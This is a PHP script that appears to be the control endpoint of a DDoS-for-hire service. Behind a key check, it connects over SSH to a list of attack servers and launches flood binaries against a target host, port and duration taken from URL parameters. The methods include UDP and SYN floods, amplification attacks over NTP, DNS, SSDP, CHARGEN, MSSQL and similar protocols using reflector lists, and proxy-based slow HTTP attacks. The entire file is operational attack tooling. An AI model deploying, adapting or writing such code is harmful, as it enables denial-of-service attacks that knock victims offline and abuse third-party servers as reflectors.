<?php
if (!function_exists('ssh2_connect'))
{
        die("Install ssh2 module.\n");
}
if ($_GET['key'] != "这里随便设置一个Key Code"){
die("Go Fuck Baidu by Arthur");
}
if (isset($_GET['host'], $_GET['port'], $_GET['time'], $_GET['method'])) {
        $SERVERS = array(
                "服务器IP"       =>      array("账号", "密码")
                );
        class ssh2 {
                var $connection;
                function __construct($host, $user, $pass) {
                        if (!$this->connection = ssh2_connect($host, 22))
                                throw new Exception("Error connecting to server");
                        if (!ssh2_auth_password($this->connection, $user, $pass))
                                throw new Exception("Error with login credentials");
                }

                function exec($cmd) {
                        if (!ssh2_exec($this->connection, $cmd))
                                throw new Exception("Error executing command: $cmd");

                        ssh2_exec($this->connection, 'exit');
                        unset($this->connection);
                }
        }
        $port = (int)$_GET['port'] > 0 && (int)$_GET['port'] < 65536 ? $_GET['port'] : 80;
        $port = preg_replace('/\D/', '', $port);
        $ip = preg_match('/^[a-zA-Z0-9\.-_]+$/', $_GET['host']) ? $_GET['host'] : die();
        $time = (int)$_GET['time'] > 0 && (int)$_GET['time'] < (60*60) ? (int)$_GET['time'] : 30;
        $time = preg_replace('/\D/', '', $time);
        $domain = $_GET['host'];
        if(!filter_var($domain, FILTER_VALIDATE_URL) && !filter_var($domain, FILTER_VALIDATE_IP))
        {
            die("Invalid Domain");
        }
        $smIP = str_replace(".", "", $ip);
        $smDomain = str_replace(".", "", $domain);
        $smDomain = str_replace("http://", "", $smDomain);
	if($_GET['method'] == "UDP") { $command = "screen -dmS {$smIP} ./udp {$ip} {$port} 1 500 3 {$time}"; }
        elseif($_GET['method'] == "DOMINATE") { $command = "screen -dmS {$smIP} ./dominate {$ip} {$port} 3 -1 {$time}"; }
        elseif($_GET['method'] == "SSYN") { $command = "screen -dmS {$smIP} ./ssyn {$ip} {$port} 3 {$time}"; }
        elseif($_GET['method'] == "XSYN") { $command = "screen -dmS {$smIP} ./xsyn {$ip} {$port} 3 {$time}"; }
        elseif($_GET['method'] == "SSDP") { $command = "screen -dmS {$smIP} ./ssdp {$ip} {$port} ssdp_amp.txt 3 {$time}"; }
        elseif($_GET['method'] == "CHARGEN") { $command = "screen -dmS {$smIP} ./chargen {$ip} {$port} chargen_amp.txt 8 -1 {$time}"; }
        elseif($_GET['method'] == "TS3") { $command = "screen -dmS {$smIP} ./ts3 {$ip} {$port} ts3_amp.txt 3 {$time}"; }
        elseif($_GET['method'] == "NTP") { $command = "screen -dmS {$smIP} ./ntp {$ip} {$port} ntp_amp.txt 3 {$time}"; }
	    elseif($_GET['method'] == "MSSQL") { $command = "screen -dmS {$smIP} ./MSSQL {$ip} {$port} mssql_amp.txt 8 {$time}"; }
	    elseif($_GET['method'] == "QOTD") { $command = "screen -dmS {$smIP} ./qotd {$ip} {$port} qotd_amp.txt -1 8 {$time}"; }
	    elseif($_GET['method'] == "MDNS") { $command = "screen -dmS {$smIP} ./mdns {$ip} {$port} mdns_amp.txt 3 {$time}"; }
		elseif($_GET['method'] == "NETBIOS") { $command = "screen -dmS {$smIP} ./netbios {$ip} {$port} netbios_amp.txt 3 {$time}"; }
		elseif($_GET['method'] == "HEARTBLEED") { $command = "screen -dmS {$smIP} ./heartbleed {$ip} {$port} hb_amp.txt 8 -1 {$time}"; }
		elseif($_GET['method'] == "VSE") { $command = "screen -dmS {$smIP} ./vse {$ip} 3 -1 {$time}"; }
	    elseif($_GET['method'] == "RUDY") { $command = "screen -dmS {$smIP} ./rudy {$ip} 1 8 {$time} proxies.txt 0"; }
	    elseif($_GET['method'] == "SYN") { $command = "screen -dmS {$smIP} ./syn {$ip} {$port} {$time}"; }
	    elseif($_GET['method'] == "DNS") { $command = "screen -dmS {$smIP} ./DNS {$ip} {$port} dns_amp.txt {$time}"; }
	    elseif($_GET['method'] == "QUAKE") { $command = "screen -dmS {$smIP} ./quake {$ip} {$port} quake_amp.txt 8 {$time}"; }
	    elseif($_GET['method'] == "SLOW") { $command = "screen -dmS {$smIP} ./slow {$ip} 8 proxies.txt {$time} 0"; }
	    elseif($_GET['method'] == "ESSYN") { $command = "screen -dmS {$smIP} ./essyn {$ip} {$ip} {$port} 8 -1 {$time}"; }
        elseif($_GET['method'] == "STOP") { $command = "screen -X -s {$smIP} quit"; }
        else die();
        foreach ($SERVERS as $server=>$credentials) {
                $disposable = new ssh2($server, $credentials[0], $credentials[1]);
                $disposable->exec($command);
}
}
?>